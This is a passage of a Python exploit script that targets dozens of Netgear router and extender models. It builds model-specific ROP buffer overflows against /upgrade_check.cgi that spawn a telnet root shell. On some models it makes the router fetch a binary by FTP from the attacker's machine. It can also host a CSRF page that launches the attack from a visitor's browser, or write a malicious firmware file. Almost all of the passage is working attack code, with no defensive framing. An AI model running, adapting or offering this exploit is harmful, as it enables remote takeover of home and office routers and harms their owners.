	"WNDR3300V2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR3400"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR3400V2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR3400V3" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR3700V3" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR4000"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR4500"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNDR4500V2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR1000V3"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR2000V2"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR3500L"   : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR3500V2"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR3500LV2" : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
	"WNR834BV2"  : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",

	# On some versions of the EX6100, port 8888 is already used, so use 3333 instead
	"EX6100"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p3333 -l/bin/sh",

	# Some devices need different commands based on the version
	"WN3000RP"   : collections.defaultdict(lambda : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh",
									{"1.0.2.64" : "/usr/sbin/utelnetd -p8888 -l/bin/sh -d"}),

	# The WNR3500/WGT624v4 don't have the device files or mknod, we'll have the victim download it
	"WNCE3001"  : "/usr/sbin/ftpc -f /tmp/mknod -s mknod -d LOCAL_IP_ADDRESS -u anonymous; chmod a+x /tmp/mknod; /tmp/mknod; telnetd -p8888 -l/bin/sh",
	"WNR3500"   : "/usr/sbin/ftpc -f /tmp/mknod -s mknod -d LOCAL_IP_ADDRESS -u anonymous; chmod a+x /tmp/mknod; /tmp/mknod; telnetd -p8888 -l/bin/sh",
}

# The default command on these devices needs to download mknod via FTP
ftp_devices = {"WNR3500" : "arm_lsb", "WNCE3001" : "mips_msb"}

###########################################################################
## Functions ##############################################################
###########################################################################

def send(ip, port, is_https, payload, keep_open = False):
	if is_https:
		return send_ssl(ip, port, payload, keep_open)
	else:
		return send_plain(ip, port, payload, keep_open)

def send_plain(ip, port, payload, keep_open):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	if keep_open:
		return sock
	sock.close()

def send_ssl(ip, port, payload, keep_open):
	import ssl
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	wrappedSocket = ssl.wrap_socket(sock)
	wrappedSocket.connect((ip, port))
	wrappedSocket.send(payload)
	if keep_open:
		return wrappedSocket
	wrappedSocket.close()

def p32(address, model):
	if model in big_endian_devices:
		return struct.pack(">I", address)
	return struct.pack("<I", address)

def find_item(contents, start_string):
	start = contents.find(start_string)
	if(start == -1):
		print("Failed to automatically detect version.")
		sys.exit(1)

	start += len(start_string)
	end = contents.find("\r\n", start)
	return contents[start:end].upper() # upper just in case

def detect_model_version(ip, port, is_https):
	request = "GET /currentsetting.htm HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip)
	sock = send(ip, port, is_https, request, True)

	contents = ""
	while contents.find("InternetConnectionStatus") == -1 and contents.find("401 Unauthorized") == -1:
		contents += sock.recv(1)

	# Some older models/versions don't have the currentsetting.htm page, or it's protected by login
	if contents.find("401 Unauthorized") != -1:
		print("Version detection against this router is not possible using currentsetting.htm.")
		print("Received response:\n{}\n".format(contents))
		sys.exit(1)

	model = find_item(contents, "Model=")
	firmware_version = find_item(contents, "Firmware=")

	if (model not in firmware_version_to_human_version.keys() or
			firmware_version not in firmware_version_to_human_version[model]):
		print("Unknown model and version: {} {}".format(model, firmware_version))
		sys.exit(1)

	return model, firmware_version_to_human_version[model][firmware_version]

def get_ip(remote_ip):
	for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
		if not ip.startswith("127."):
			return ip
	for ip in [[(s.connect((remote_ip, 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]:
		return ip
	raise RuntimeError("Cannot get IP address")

ftp_thread = None
def start_ftp(mknod_suffix):
	from twisted.protocols.ftp import FTPFactory, FTPRealm
	from twisted.cred.portal import Portal
	from twisted.cred.checkers import AllowAnonymousAccess
	from twisted.internet import reactor
	from threading import Thread

	global ftp_thread

	if not os.path.exists("./ftp"):
		os.mkdir('./ftp')
	if not os.path.exists("./ftp/mknod"):
		shutil.copy('./mknod_{}'.format(mknod_suffix), './ftp/mknod')

	p = Portal(FTPRealm('./ftp'), [AllowAnonymousAccess()])
	f = FTPFactory(p)
	reactor.listenTCP(21, f)

	ftp_thread = Thread(target=reactor.run, args=(False,))
	ftp_thread.start()

def stop_ftp():
	from twisted.internet import reactor
	global ftp_thread

	reactor.stop()
	ftp_thread.join()

class CSRFRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	def do_GET(self):
		self.send_response(200)
		self.send_header("Content-Type", "text/html")
		self.send_header("Content-Length", len(self.page))
		self.end_headers()
		self.wfile.write(self.page)

###########################################################################
## Main Execution #########################################################
###########################################################################

def main(args):
	if args.version == "" or args.model == "":
		if args.csrf:
			print("The model and version cannot be automatically determined in CSRF mode.")
			sys.exit(1)
		args.model, args.version = detect_model_version(args.ip, args.port, args.https)
		print("Automatically detected model {} and version {}".format(args.model, args.version))

	if args.version_only:
		sys.exit(1)

	if args.version not in address_info[args.model]:
		print("This exploit does not have a ROP gadget for the selected version ({}).".format(args.version))
		sys.exit(1)

	USING_DEFAULT_COMMAND = (args.command == "START_TELNET")
	if USING_DEFAULT_COMMAND:
		# Resolve the default command (which may be specific to a version)
		args.command = default_commands[args.model]
		if type(args.command) != str:
			args.command = args.command[args.version]

		# if the default command uses the FTP server, we need to fixup our local IP address and start the server
		if args.model in ftp_devices:
			if args.local_ip == "":
				args.local_ip = get_ip(args.ip)
				print("Automatically detected local IP address {}".format(args.local_ip))
			args.command = args.command.replace("LOCAL_IP_ADDRESS", args.local_ip)
			if not args.file:
				start_ftp(ftp_devices[args.model])

	# Generate the payload
	rop_gadget = address_info[args.model][args.version]
	if type(rop_gadget) == list:
		rop_gadget = [p32(x, args.model) for x in rop_gadget]
	else:
		rop_gadget = p32(rop_gadget, args.model)
	data = ""
	data += "*#$^\x00" # marker
	data += "\x00\x04\x00" # size
	data += "A" * 0x60

	if args.model in ["D8500", "R6400", "R6400V2", "R6700", "R6700V3", "R6900", "R6900P", "R7000", "R7000P", "R7100LG", "R7300",
			"R7850", "R7900", "R8000", "R8300", "R8500", "RS400", "XR300"]:
		data += "B" * 0x4  # r4
		data += "C" * 0x4  # r5
		data += "D" * 0x4  # r6
		data += "E" * 0x4  # r7
		data += "F" * 0x4  # r8
		data += "G" * 0x4  # r9
		data += "H" * 0x4  # r10
		data += "I" * 0x4  # r11
		data += rop_gadget # pc
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif (
			# These models all use this gadget sequence
			(args.model in ["AC1450", "DC112A", "EX6200", "MBR624GU", "R6200V2", "R6300V2", "R6250", "WNR3500"])
			# These models only use this gadget sequence for some versions
			or (args.model == "EX7000" and args.version in ["1.0.0.66", "1.0.0.62", "1.0.0.58", "1.0.0.56", "1.0.0.50", "1.0.0.42",
																											"1.0.0.38", "1.0.0.36", "1.0.0.32", "1.0.0.30"])
			):
		data += "B" * 0x4  # r5
		data += "C" * 0x4  # r6
		data += "D" * 0x4  # r7
		data += "E" * 0x4  # r8
		data += rop_gadget # pc
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x400 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "EX7000":
		# The other versions are done up above with other similar firmwares
		data += "B" * 0x4  # r5
		data += "C" * 0x4  # r6
		data += "D" * 0x4  # r7
		data += "E" * 0x4  # r8
		data += "G" * 0x4  # r9
		data += "H" * 0x4  # r10
		data += rop_gadget # pc
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x400 # Pad out the payload (it needs to be at least a certain size)

	elif (
			# These models all use this gadget sequence
			(args.model in ["MBM621", "WGR614V8", "WGT624V4", "WN2500RP", "WN2500RPV2", "WN3100RP", "WNDR3300", "WNDR3300V2",
				"WNR834BV2", "WNR1000V3"])
			# These models only use this gadget sequence for some versions
			or (args.model == "WN3000RP" and args.version in ["1.0.1.36", "1.0.1.34", "1.0.1.18", "1.0.0.12"])
			or (args.model == "WNR3500L" and args.version in ["1.0.2.50", "1.0.2.50NA", "1.0.2.26", "1.0.2.26NA", "1.0.0.88",
																													"1.0.0.88NA", "1.0.0.86", "1.0.0.86NA"])
			or (args.model == "WNDR3400" and args.version in ["1.0.0.38", "1.0.0.34"])
			or (args.model == "WNR2000V2" and args.version in ["1.0.0.40", "1.0.0.40NA", "1.0.0.35", "1.0.0.34", "1.0.0.34NA"])
			or (args.model == "WNR3500V2" and args.version in ["1.0.2.14", "1.0.2.14NA", "1.0.2.10", "1.0.2.10NA","1.0.0.64",
																													"1.0.0.64NA"])
		):
		data += "B" * 0x4   # s0
		data += "C" * 0x4   # s1
		data += "D" * 0x4   # s2
		data += "E" * 0x4   # s3
		data += "F" * 0x4   # Padding
		data += rop_gadget  # ra
		data += "G" * 0x18  # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x400 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WGR614V9" or args.model == "WGR614V10":
		data += "B" * 0x4  # s0
		data += "C" * 0x4  # s1
		data += "D" * 0x4  # s2
		data += "E" * 0x4  # s3
		data += "F" * 0x4  #
		data += rop_gadget # ra
		data += "G" * 0x30 #
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "DGN2200":
		data += "\x00" * 4    # s0
		data += rop_gadget[1] # s1
		data += "\x00" * 4    # s2
		data += "\x00" * 4    # s3
		data += "\x00" * 4    # s4
		data += "\x00" * 4    # s5
		data += "\x00" * 4    # s6
		data += rop_gadget[0] # ra
		data += "B" * 0x1B9   #
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "DGN2200V4":
		data += "A" * 4       # padding
		data += "\x00" * 4    # s0 (must be 0 so the call to system doesn't change t9)
		data += "B" * 4       # s1
		data += "C" * 4       # s2
		data += "D" * 4       # s3
		data += rop_gadget[0] # ra
		data += "E" * 0xA0    #
		data += "F" * 4       # s0
		data += rop_gadget[1] # ra
		data += "G" * 0x19    #
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNR3500LV2":
		data += "\x00" * 4 # s0
		data += "B" * 0x4  # s1
		data += "C" * 0x4  # s2
		data += "D" * 0x4  # s3
		data += "E" * 0x4  # s4
		data += "F" * 0x4  # s5
		data += "G" * 0x4  # s6
		data += "H" * 0x4  # s7
		data += "I" * 0x4  # fp
		data += rop_gadget[0] # ra
		data += "J" * 0x10 # Padding
		data += "K" * 0x4  # gp
		data += "L" * 0x8C # Padding
		data += "M" * 0x4  # s0
		data += "N" * 0x4  # s1
		data += rop_gadget[1] # ra
		data += "O" * 0x4  # Padding
		if args.version == "1.0.0.10":
			# Version 1.0.0.10 uses a different gadget then the rest
			data += "P" * 0x19 # Padding
		else:
			data += "P" * 0x80 # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNDR3700V3":
		if args.version == "1.0.0.18":
			# Version 1.0.0.18 uses sp based frames, so it's a little easier to ROP to system
			data += "\x00" * 4  # s0
			data += "B" * 0x4   # s1
			data += "C" * 0x4   # s2
			data += "D" * 0x4   # s3
			data += "E" * 0x4   # s4
			data += "F" * 0x4   # s5
			data += "G" * 0x4   # s6
			data += rop_gadget[0] # ra
			data += "H" * 0x10  # Padding
			data += "I" * 0x4   # gp
			data += "J" * 0x104 # Padding
			data += "K" * 0x4   # s0
			data += rop_gadget[1] # ra
			data += "L" * 0x19 # Padding

		else:
			# The other versions use fp frames and we overflow fp, so we have to fix it
			# before we can set a0 to the stack
			data += "B" * 0x4     # Padding
			data += "C" * 0x4     # fp
			data += rop_gadget[1] # ra
			data += "D" * 0x10    # Padding
			data += rop_gadget[0] # gp
			data += "E" * 0x8     # Padding
			data += rop_gadget[2] # ra
			data += "F" * 0x25    # Padding

		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WN3000RP":
		# The other versions are done up above with other similar firmwares
		data += "B" * 0x4     # s0
		data += "C" * 0x4     # s1
		data += "D" * 0x4     # s2
		data += "\x00" * 0x4  # s3
		data += "E" * 0x4     # s4
		data += "F" * 0x4     # s5
		data += "G" * 0x4     # s6
		data += rop_gadget[0] # ra
		data += "H" * 0x28    # Padding
		data += "I" * 0x4     # gp
		data += "J" * 0x104   # Padding
		data += "K" * 0x4     # s0
		data += "L" * 0x4     # s1
		data += "M" * 0x4     # s2
		data += "N" * 0x4     # s3
		data += "O" * 0x4     # s4
		data += rop_gadget[1] # ra
		data += "P" * 0x19    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNR2000V2":
		# The other versions are done up above with other similar firmwares
		data += "B" * 0x4  # s0
		data += "C" * 0x4  # s1
		data += "D" * 0x4  # s2
		data += "E" * 0x4  # s3
		data += "F" * 0x4  # s4
		data += "G" * 0x4  # s5
		data += "H" * 0x4  # s6
		data += rop_gadget # ra
		data += "I" * 0x78 # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNDR3400":
		# The other versions are done up above with other similar firmwares
		data += "\x00" * 4    # s0
		data += "B" * 0x4     # s1
		data += "C" * 0x4     # s2
		data += "D" * 0x4     # s3
		data += "E" * 0x4     # s4
		data += "F" * 0x4     # s5
		data += "G" * 0x4     # s6
		data += rop_gadget[0] # ra
		data += "H" * 0x10    # Padding
		data += "I" * 0x4     # gp
		data += "J" * 0x104   # Padding
		data += "K" * 0x4     # s0
		data += rop_gadget[1] # ra
		data += "L" * 0x19    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNR3500L":
		# The other versions are done up above with other similar firmwares
		data += "B" * 0x4     # s0
		data += "C" * 0x4     # s1
		data += "D" * 0x4     # s2
		data += "E" * 0x4     # s3
		data += "F" * 0x4     # s4
		data += "G" * 0x4     # s5
		data += "H" * 0x4     # s6
		data += "I" * 0x4     # s7
		data += rop_gadget[1] # ra
		data += "J" * 4       # Padding
		data += "K" * 0x10    # Padding
		data += rop_gadget[0] # gp
		data += "L" * 0x8     # Padding
		data += rop_gadget[2] # ra
		data += "M" * 0x40    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNDR4000":
		if args.version in ["1.0.0.66", "1.0.0.82"]:
			# These versions use sp based frames, so it's a little easier to ROP to system
			data += "\x00" * 4  # s0
			data += "B" * 0x4   # s1
			data += "C" * 0x4   # s2
			data += "D" * 0x4   # s3
			data += "E" * 0x4   # s4
			data += "F" * 0x4   # s5
			data += "G" * 0x4   # s6
			data += rop_gadget[0] # ra
			data += "H" * 0x10  # Padding
			data += "I" * 0x4   # gp
			data += "J" * 0x104 # Padding
			data += "K" * 0x4   # s0
			data += rop_gadget[1] # ra
			data += "L" * 0x19 # Padding

		else:
			# The other versions use fp frames and we overflow fp, so we have to fix it
			# before we can set a0 to the stack
			data += "B" * 0x4     # Padding
			data += "C" * 0x4     # fp
			data += rop_gadget[1] # ra
			data += "D" * 0x10    # Padding
			data += rop_gadget[0] # gp
			data += "E" * 0x8     # Padding
			data += rop_gadget[2] # ra
			data += "F" * 0x25    # Padding

		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model in ["DGN2200M", "DGND3700", "MVBR1210C", "MBR1200", "MBR1515", "MBR1516", "MBRN3000"]:
		data += "\x00" * 4    # s0
		data += "B" * 0x4     # s1
		data += "C" * 0x4     # s2
		data += "D" * 0x4     # s3
		data += "E" * 0x4     # s4
		data += "F" * 0x4     # s5
		data += "G" * 0x4     # s6
		data += rop_gadget[0] # ra
		data += "H" * 0x10    # Padding
		data += "I" * 0x4     # gp
		data += "J" * 0x6C    # Padding
		data += "K" * 0x4     # s0
		data += rop_gadget[1] # ra
		data += "L" * 0x19    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "D6300":
		data += "B" * 0x4     # Padding
		data += "\x00" * 0x4  # s0
		data += "D" * 0x4     # s1
		data += "E" * 0x4     # s2
		data += "F" * 0x4     # s3
		data += rop_gadget[0] # ra
		data += "G" * 0xE4    # Padding
		data += "H" * 0x4     # s0
		data += "I" * 0x4     # s1
		data += "J" * 0x4     # s2
		data += "K" * 0x4     # s3
		data += rop_gadget[1] # ra
		data += "L" * 0x19    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model in ["D6220", "D6400", "D7000V2"]:
		data += "B" * 0x4     # s0
		data += "C" * 0x4     # s1
		data += "D" * 0x4     # s2
		data += rop_gadget    # ra
		data += "E" * 0x18    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model in ["LG2200D", "R4500", "R6300", "WNDR3400V2", "WNDR3400V3", "WNDR4500", "WNDR4500V2"]:
		data += "B" * 0x4  # s0
		data += "C" * 0x4  # s1
		data += "D" * 0x4  # s2
		data += "E" * 0x4  # s3
		data += "F" * 0x4  # s4
		data += "G" * 0x4  # s5
		data += "H" * 0x4  # s6
		data += rop_gadget # ra
		data += "I" * 0x78 # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model in ["R6200", "WN3500RP"]:
		data += "\x00" * 4    # s0
		data += "B" * 0x4     # s1
		data += "C" * 0x4     # s2
		data += "D" * 0x4     # s3
		data += "E" * 0x4     # s4
		data += "F" * 0x4     # s5
		data += "G" * 0x4     # s6
		data += rop_gadget[0] # ra
		data += "H" * 0x10    # Padding
		data += "I" * 0x4     # gp
		data += "J" * 0x8C    # Padding
		data += "K" * 0x4     # s0
		data += "L" * 0x4     # s1
		data += rop_gadget[1] # ra
		data += "M" * 0x4     # Padding
		data += "N" * 0x19    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNR3500V2":
		# The other versions are done up above with other similar firmwares
		data += "B" * 0x4  # s0
		data += "C" * 0x4  # s1
		data += "D" * 0x4  # s2
		data += "E" * 0x4  # s3
		data += "F" * 0x4  # s4
		data += "G" * 0x4  # s5
		data += "H" * 0x4  # s6
		data += rop_gadget # ra
		data += "I" * 0xAC # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "WNCE3001":
		data += "B" * 0x4  # s0
		data += "C" * 0x4  # s1
		data += "D" * 0x4  # s2
		data += "E" * 0x4  # s3
		data += "F" * 0x4  # s4
		data += rop_gadget # ra
		data += "I" * 0x18 # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x400 # Pad out the payload (it needs to be at least a certain size)

	elif args.model in ["EX3700", "EX3800", "EX3920", "EX6000", "EX6100", "EX6120", "EX6130", "EX6920"]:
		# The devices use fp frames and we overflow fp, so we have to fix it before we can
		# set a0 to the stack
		data += "B" * 0x8     # Padding
		data += "C" * 0x4     # fp
		data += rop_gadget[1] # ra
		data += "D" * 0x10    # Padding
		data += rop_gadget[0] # gp
		data += "E" * 0x8     # Padding
		data += rop_gadget[2] # ra
		data += "F" * 0x21    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

	elif args.model == "EX6150":
		data += rop_gadget[1] # ra
		data += "B" * 0x10    # Padding
		data += rop_gadget[0] # gp
		data += "C" * 0x8     # Padding
		data += rop_gadget[2] # ra
		data += "D" * 0x25    # Padding
		data += args.command + "\x00" # Add the command and then NULL-terminate it
		data += "Z" * 0x400   # Pad out the payload (it needs to be at least a certain size)

	else:
		print("Unknown model: {}".format(args.model))
		sys.exit(1)

	# Some of the different models/versions use different names for the argument
	argument_name = "mtenFWUpload"
	if args.model in argument_names and args.version in argument_names[args.model]:
		argument_name = argument_names[args.model][args.version]

	if args.file:
		# Write the payload to a file
		fd = open(args.ip, "wb")
		fd.write(data)
		fd.close()

	elif args.csrf:
		# Start a web server to serve a webpage that will send CSRF payload to exploit the router
		protocol = "http"
		port = ""
		if args.https:
			protocol = "https"
		if (not args.https and args.port != 80) or (args.https and args.port != 443):
			port = ":{}".format(args.port)
		base_url = "{}://{}{}".format(protocol, args.ip, port)

		# Prepend the necessary fields (they don't actually parse the HTTP request, just search for strings)
		data = 'Content-Disposition: AAAA\r\nContent-Length: {}\r\nContent-Type: application/octet-stream\r\nname="{}"\r\n\r\n{}'.format(len(data), argument_name, data)

		# Create the CSRF webpage
		webpage = "<html><body><script>"
		webpage += 'var data = new ArrayBuffer({})\n;'.format(len(data))
		webpage += 'var lInt8View = new Uint8Array(data);\n'
		for i in range(len(data)):
			webpage += 'lInt8View[{}]={};\n'.format(i,ord(data[i]))
		webpage += 'var xhr = new XMLHttpRequest;\n'
		webpage += 'xhr.open("POST", "{}/upgrade_check.cgi", false);\n'.format(base_url)
		webpage += 'xhr.send(data);\n'
		webpage += "</script></body></html>"

		CSRFRequestHandler.page = webpage
		SocketServer.TCPServer.allow_reuse_address = True
		server = SocketServer.TCPServer(("", 8000), CSRFRequestHandler)
		print("CSRF Web Server started on port 8000 for {} Version {} exploit".format(args.model, args.version))
		server.serve_forever()

	else:
		# Send the payload
		payload = ''
		payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
		payload += 'Host: {}\r\n'.format(args.ip)
		payload += 'Content-Disposition: AAAA\r\n'
		payload += 'Content-Length: {}\r\n'.format(len(data))
		payload += 'Content-Type: application/octet-stream\r\n'
		payload += 'name="{}"\r\n'.format(argument_name)
		payload += '\r\n'
		payload += data

		send(args.ip, args.port, args.https, payload)
		if USING_DEFAULT_COMMAND and args.model in ftp_devices:
			time.sleep(20)
			stop_ftp()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Run the exploit')
	parser.add_argument('ip', type=str, default=None, help='The IP address of the webserver to exploit')
	parser.add_argument('-command', type=str, default="START_TELNET", help='The command to run; default is to start telnet on port 8888 (or 3333 if 8888 is already used)')
	parser.add_argument('-csrf', required=False, action='store_true', help='Run a web server that sends the exploit as a CSRF payload')
	parser.add_argument('-https', required=False, action='store_true', help='Run the exploit against a webserver running HTTPS')
	parser.add_argument('-file', required=False, action='store_true', help='Write the exploit firmware to a file (which typically'
		+ ' has a file extension .chk). Use the ip argument to specify the filename.')
	parser.add_argument('-port', type=int, default=80, help='The port of the webserver to exploit')
	parser.add_argument('-model', type=str, default="", help='The model of the webserver to exploit (default autodetect).'
		+ ' Supported models are: {}'.format(", ".join(address_info.keys())))
	parser.add_argument('-version', type=str, default="", help='The version of the webserver to exploit (default autodetect).'
		+ ' Supported versions are: {}'.format("; ".join(["{}: {}".format(x, ", ".join(address_info[x])) for x in address_info.keys()])))
	parser.add_argument('-local_ip', type=str, default="", help='The IP address the exploited host should connect back to download a'
		+ ' payload, only used on the devices: {} (default autodetect).'.format(", ".join(ftp_devices.keys())))
	parser.add_argument('-version-only', required=False, action='store_true', help="Only detect the model/version of a device, don't exploit")
	args = parser.parse_args()
	args.model = args.model.upper()

	main(args)